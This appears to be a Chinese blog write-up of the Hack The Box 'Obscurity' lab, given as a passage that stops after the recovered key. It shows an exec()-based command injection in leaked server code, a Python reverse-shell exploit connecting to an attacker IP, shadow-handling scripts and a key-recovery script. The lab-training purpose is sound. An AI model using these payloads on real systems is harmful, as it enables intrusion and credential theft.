@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>HTB Obscurity靶机实战 | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" HTB , 靶机 ">
+  <meta name="description" content="HTB Obscurity靶机实战 | prontosil&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="关于我">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://prontosil.com/about/index.html">
+<meta property="og:site_name" content="prontosil&#39;s Blog">
+<meta property="og:description" content="关于我">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-30T01:19:01.000Z">
+<meta property="article:modified_time" content="2020-01-30T01:20:22.385Z">
+<meta property="article:author" content="prontosil">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//https-prontosil-club.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>prontosil</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/xinyongpeng" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+        <a title="jianshu" href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-jianshu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="zhihu" href="https://www.zhihu.com/people/he-yan-52-34" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-zhihu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="csdn" href="https://blog.csdn.net/qq_41645130" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-csdn"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1365155759@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1365155759&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(17)</small></div></li>
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="生活">生活<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="编程">编程<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="17">
+<input type="hidden" id="yelog_site_word_count" value="13.4k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">HTB</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">靶机</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxe</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xml</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">java</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">反序列化</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxd</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">hexdump</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">汇编</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">dosbox</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Apache</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">RCE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SSI</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">截断</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="渗透测试 "
+           href="/posts/a0911a0b/"
+           data-tag="HTB,靶机"
+           data-author="" >
+            <span class="post-title" title="HTB Obscurity靶机实战">HTB Obscurity靶机实战</span>
+            <span class="post-date" title="2020-02-05 21:50:54">2020/02/05</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5d5d07b8/"
+           data-tag="JavaScript"
+           data-author="" >
+            <span class="post-title" title="JavaScript原型链污染">JavaScript原型链污染</span>
+            <span class="post-date" title="2020-01-30 09:13:31">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/70b2e753/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="docker基本使用指南">docker基本使用指南</span>
+            <span class="post-date" title="2020-02-02 22:22:30">2020/02/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/2e545689/"
+           data-tag="xxe,xml"
+           data-author="" >
+            <span class="post-title" title="XXE复习">XXE复习</span>
+            <span class="post-date" title="2020-01-30 07:48:51">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/3d16ce36/"
+           data-tag="php,函数"
+           data-author="" >
+            <span class="post-title" title="php常用函数">php常用函数</span>
+            <span class="post-date" title="2020-01-30 17:15:35">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/21b61fbe/"
+           data-tag="java,反序列化"
+           data-author="" >
+            <span class="post-title" title="java审计笔记">java审计笔记</span>
+            <span class="post-date" title="2020-01-30 09:05:39">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/1f38a4f2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="safeharbor靶机渗透">safeharbor靶机渗透</span>
+            <span class="post-date" title="2020-01-31 19:35:18">2020/01/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5877398d/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="upload-lab做题笔记">upload-lab做题笔记</span>
+            <span class="post-date" title="2020-01-30 21:17:58">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/728b20a1/"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="代码审计初尝">代码审计初尝</span>
+            <span class="post-date" title="2020-02-01 10:31:26">2020/02/01</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/b69cd839/"
+           data-tag="域名"
+           data-author="" >
+            <span class="post-title" title="域名解析记录">域名解析记录</span>
+            <span class="post-date" title="2020-01-30 10:40:56">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/f1616294/"
+           data-tag="Linux,dig"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-dig">每天一个Linux命令-dig</span>
+            <span class="post-date" title="2020-01-30 10:45:02">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/2e8d4a2a/"
+           data-tag="xxd,hexdump"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-xxd">每天一个Linux命令-xxd</span>
+            <span class="post-date" title="2020-01-31 19:35:51">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/734660ee/"
+           data-tag="leetcode"
+           data-author="" >
+            <span class="post-title" title="每天一道leetcode-数组题">每天一道leetcode-数组题</span>
+            <span class="post-date" title="2020-01-30 10:45:29">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/2e6a5f8a/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="每天以一道leetcode-链表题">每天以一道leetcode-链表题</span>
+            <span class="post-date" title="2020-01-31 19:35:34">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/57418b7f/"
+           data-tag="汇编,dosbox"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土一">汇编从入门到入土一</span>
+            <span class="post-date" title="2020-02-01 22:02:40">2020/02/01</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/6cc1a5d6/"
+           data-tag="汇编"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土二">汇编从入门到入土二</span>
+            <span class="post-date" title="2020-02-02 22:16:48">2020/02/02</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/becfc22d/"
+           data-tag="文件上传,Apache,RCE,SSI,截断"
+           data-author="" >
+            <span class="post-title" title="漏洞复现-Apache SSI远程命令执行">漏洞复现-Apache SSI远程命令执行</span>
+            <span class="post-date" title="2020-01-30 10:48:35">2020/01/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-HTBObscurity靶机实战" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">HTB Obscurity靶机实战</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="渗透测试">渗透测试</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">HTB</a>
+            
+            <a class="color3">靶机</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-05 22:23:17'>2020-02-05 21:50</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:3k</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-flag"><span class="toc-text">user flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里可以先设置一下hosts文件 </p>
+<pre><code>10.10.10.168 obscure.htb</code></pre><p>扫描端口发现开放了 <code>8080</code> 的web端口</p>
+<p>页面提示有一个源码泄露</p>
+<pre><code>Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory</code></pre><p>那我们就需要爆破目录了</p>
+<p>使用 <code>wfuzz</code></p>
+<pre><code class="bash">sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre>
+<p><img src="/posts/a0911a0b/1580912401299.png" alt></p>
+<p>得到源码：</p>
+<pre><code class="python">import socket
+import threading
+from datetime import datetime
+import sys
+import os
+import mimetypes
+import urllib.parse
+import subprocess
+
+respTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}
+Date: {dateSent}
+Server: {server}
+Last-Modified: {modified}
+Content-Length: {length}
+Content-Type: {contentType}
+Connection: {connectionType}
+
+{body}
+&quot;&quot;&quot;
+DOC_ROOT = &quot;DocRoot&quot;
+
+CODES = {&quot;200&quot;: &quot;OK&quot;, 
+        &quot;304&quot;: &quot;NOT MODIFIED&quot;,
+        &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;, 
+        &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}
+
+MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;, 
+        &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;, 
+        &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}
+
+
+class Response:
+    def __init__(self, **kwargs):
+        self.__dict__.update(kwargs)
+        now = datetime.now()
+        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)
+    def stringResponse(self):
+        return respTemplate.format(**self.__dict__)
+
+class Request:
+    def __init__(self, request):
+        self.good = True
+        try:
+            request = self.parseRequest(request)
+            self.method = request[&quot;method&quot;]
+            self.doc = request[&quot;doc&quot;]
+            self.vers = request[&quot;vers&quot;]
+            self.header = request[&quot;header&quot;]
+            self.body = request[&quot;body&quot;]
+        except:
+            self.good = False
+
+    def parseRequest(self, request):        
+        req = request.strip(&quot;\r&quot;).split(&quot;\n&quot;)
+        method,doc,vers = req[0].split(&quot; &quot;)
+        header = req[1:-3]
+        body = req[-1]
+        headerDict = {}
+        for param in header:
+            pos = param.find(&quot;: &quot;)
+            key, val = param[:pos], param[pos+2:]
+            headerDict.update({key: val})
+        return {&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body}
+
+
+class Server:
+    def __init__(self, host, port):    
+        self.host = host
+        self.port = port
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((self.host, self.port))
+
+    def listen(self):
+        self.sock.listen(5)
+        while True:
+            client, address = self.sock.accept()
+            client.settimeout(60)
+            threading.Thread(target = self.listenToClient,args = (client,address)).start()
+
+    def listenToClient(self, client, address):
+        size = 1024
+        while True:
+            try:
+                data = client.recv(size) # 收到客户端的数据，应该就是数据包
+                if data:
+                    # Set the response to echo back the recieved data 
+                    req = Request(data.decode()) # byte转str，返回的req是list
+                    self.handleRequest(req, client, address)
+                    client.shutdown()
+                    client.close()
+                else:
+                    raise error(&#39;Client disconnected&#39;)
+            except:
+                client.close()
+                return False
+
+    def handleRequest(self, request, conn, address):
+        if request.good:
+#            try:
+                # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)
+                # print(&quot;from {0}&quot;.format(address[0]))
+#            except Exception as e:
+#                print(e)
+            document = self.serveDoc(request.doc, DOC_ROOT)
+            statusNum=document[&quot;status&quot;]
+        else:
+            document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT)
+            statusNum=&quot;400&quot;
+        body = document[&quot;body&quot;]
+
+        statusCode=CODES[statusNum]
+        dateSent = &quot;&quot;
+        server = &quot;BadHTTPServer&quot;
+        modified = &quot;&quot;
+        length = len(body)
+        contentType = document[&quot;mime&quot;] # Try and identify MIME type from string
+        connectionType = &quot;Closed&quot;
+
+
+        resp = Response(
+        statusNum=statusNum, statusCode=statusCode, 
+        dateSent = dateSent, server = server, 
+        modified = modified, length = length, 
+        contentType = contentType, connectionType = connectionType, 
+        body = body
+        )
+
+        data = resp.stringResponse()
+        if not data:
+            return -1
+        conn.send(data.encode())
+        return 0
+
+    def serveDoc(self, path, docRoot):
+        path = urllib.parse.unquote(path)
+        try:
+            info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug
+            exec(info.format(path)) # This is how you do string formatting, right?
+            cwd = os.path.dirname(os.path.realpath(__file__))
+            docRoot = os.path.join(cwd, docRoot)
+            if path == &quot;/&quot;:
+                path = &quot;/index.html&quot;
+            requested = os.path.join(docRoot, path[1:])
+            if os.path.isfile(requested):
+                mime = mimetypes.guess_type(requested)
+                mime = (mime if mime[0] != None else &quot;text/html&quot;)
+                mime = MIMES[requested.split(&quot;.&quot;)[-1]]
+                try:
+                    with open(requested, &quot;r&quot;) as f:
+                        data = f.read()
+                except:
+                    with open(requested, &quot;rb&quot;) as f:
+                        data = f.read()
+                status = &quot;200&quot;
+            else:
+                errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;)
+                mime = &quot;text/html&quot;
+                with open(errorPage, &quot;r&quot;) as f:
+                    data = f.read().format(path)
+                status = &quot;404&quot;
+        except Exception as e:
+            print(e)
+            errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;)
+            mime = &quot;text/html&quot;
+            with open(errorPage, &quot;r&quot;) as f:
+                data = f.read()
+            status = &quot;500&quot;
+        return {&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status}</code></pre>
+<p>审计源码发现关键点：</p>
+<pre><code class="python">def serveDoc(self, path, docRoot):
+    path = urllib.parse.unquote(path)
+    try:
+        info = &quot;output = &#39;Document: {}&#39;&quot; # Keep the output for later debug
+        exec(info.format(path)) # This is how you do string formatting, right?
+        cwd = os.path.dirname(os.path.realpath(__file__))
+        docRoot = os.path.join(cwd, docRoot)</code></pre>
+<p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p>
+<p><code>exec</code> 函数处存在命令注入</p>
+<pre><code class="python">In [33]: path = &quot;/&#39;;os.system(&#39;whoami&#39;)#&quot;
+
+In [34]: exec(info.format(path))
+laptop-ubiep4k5\zz</code></pre>
+<p>然后就可以通过python反弹shell了</p>
+<pre><code class="python">import requests
+import urllib
+import os
+
+url = &#39;http://10.10.10.168:8080/&#39;
+
+path=&#39;5\&#39;&#39;+&#39;\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\na=\&#39;&#39;
+
+payload = urllib.parse.quote(path)
+print(&quot;payload&quot;)
+print(url+payload)
+
+r= requests.get(url+payload)
+print(r.headers)
+print(r.text)</code></pre>
+<p>反弹到shell之后继续进行信息收集：</p>
+<p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p>
+<pre><code class="bash">www-data@obscure:/home/robert$ cat check.txt
+cat check.txt
+Encrypting this file with your key should result in out.txt, make sure your key is correct!</code></pre>
+<p><code>out.txt</code>, 这个就是加密的结果</p>
+<pre><code>www-data@obscure:/home/robert$ xxd out.txt
+xxd out.txt
+00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
+00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
+00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
+00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
+00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
+00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
+00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
+00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
+00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
+00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
+000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
+000000b0: c38c c397 c289 c281 76                   ........v</code></pre><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p>
+<pre><code>www-data@obscure:/home/robert$ hd passwordreminder.txt
+hd passwordreminder.txt
+00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|
+00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|
+0000001b</code></pre><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p>
+<pre><code class="python">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.py
+cat BetterSSH.py
+import sys
+import random, string
+import os
+import time
+import crypt
+import traceback
+import subprocess
+
+path = &#39;&#39;.join(random.choices(string.ascii_letters + string.digits, k=8))
+session = {&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0}
+try:
+    session[&#39;user&#39;] = input(&quot;Enter username: &quot;)
+    passW = input(&quot;Enter password: &quot;)
+
+    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:
+        data = f.readlines()
+    data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]
+    passwords = []
+    for x in data:
+        if not x == None:
+            passwords.append(x)
+
+    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])
+    with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:
+        f.write(passwordFile)
+    time.sleep(.1)
+    salt = &quot;&quot;
+    realPass = &quot;&quot;
+    for p in passwords:
+        if p[0] == session[&#39;user&#39;]:
+            salt, realPass = p[1].split(&#39;$&#39;)[2:]
+            break
+
+    if salt == &quot;&quot;:
+        print(&quot;Invalid user&quot;)
+        os.remove(&#39;/tmp/SSH/&#39;+path)
+        sys.exit(0)
+    salt = &#39;$6$&#39;+salt+&#39;$&#39;
+    realPass = salt + realPass
+
+    hash = crypt.crypt(passW, salt)
+
+    if hash == realPass:
+        print(&quot;Authed!&quot;)
+        session[&#39;authenticated&#39;] = 1
+    else:
+        print(&quot;Incorrect pass&quot;)
+        os.remove(&#39;/tmp/SSH/&#39;+path)
+        sys.exit(0)
+    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))
+except Exception as e:
+    traceback.print_exc()
+    sys.exit(0)
+
+if session[&#39;authenticated&#39;] == 1:
+    while True:
+        command = input(session[&#39;user&#39;] + &quot;@Obscure$ &quot;)
+        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]
+        cmd.extend(command.split(&quot; &quot;))
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        o,e = proc.communicate()
+        print(&#39;Output: &#39; + o.decode(&#39;ascii&#39;))
+        print(&#39;Error: &#39;  + e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre>
+<p><code>SuperSecureCrypt.py</code></p>
+<pre><code class="python">www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
+cat SuperSecureCrypt.py
+import sys
+import argparse
+
+def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = &quot;&quot;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr + ord(keyChr)) % 255)
+        encrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return encrypted
+
+def decrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    decrypted = &quot;&quot;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr - ord(keyChr)) % 255)
+        decrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return decrypted
+
+parser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)
+
+parser.add_argument(&#39;-i&#39;,
+                    metavar=&#39;InFile&#39;,
+                    type=str,
+                    help=&#39;The file to read&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-o&#39;,
+                    metavar=&#39;OutFile&#39;,
+                    type=str,
+                    help=&#39;Where to output the encrypted/decrypted file&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-k&#39;,
+                    metavar=&#39;Key&#39;,
+                    type=str,
+                    help=&#39;Key to use&#39;,
+                    required=False)
+
+parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)
+
+args = parser.parse_args()
+
+banner = &quot;################################\n&quot;
+banner+= &quot;#           BEGINNING          #\n&quot;
+banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;
+banner+= &quot;################################\n&quot;
+banner += &quot;  ############################\n&quot;
+banner += &quot;  #        FILE MODE         #\n&quot;
+banner += &quot;  ############################&quot;
+print(banner)
+if args.o == None or args.k == None or args.i == None:
+    print(&quot;Missing args&quot;)
+else:
+    if args.d:
+        print(&quot;Opening file {0}...&quot;.format(args.i))
+        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+            data = f.read()
+
+        print(&quot;Decrypting...&quot;)
+        decrypted = decrypt(data, args.k)
+
+        print(&quot;Writing to {0}...&quot;.format(args.o))
+        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
+            f.write(decrypted)
+    else:
+        print(&quot;Opening file {0}...&quot;.format(args.i))
+        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+            data = f.read()
+
+        print(&quot;Encrypting...&quot;)
+        encrypted = encrypt(data, args.k)
+
+        print(&quot;Writing to {0}...&quot;.format(args.o))
+        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
+            f.write(encrypted)</code></pre>
+<p>从加密的脚本中可以知道关键的加密逻辑：</p>
+<pre><code class="python">def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = &quot;&quot;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr + ord(keyChr)) % 255)
+        encrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return encrypted</code></pre>
+<p>所以我们只需要爆破密钥了</p>
+<p>爆破脚本</p>
+<pre><code class="python">import string
+with open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:
+    ta = f.read()
+
+key=&#39;&#39;
+with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:
+    data = f.read()
+    for x in range(len(data)):
+        for i in range(255):
+            ch = chr((ord(data[x])-i)%255)
+            if ch == ta[x]:
+                key +=chr(i)
+                break
+    print(key)</code></pre>
+<p>得到密钥</p>
+<pre><code>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</code></pre><blockquote>
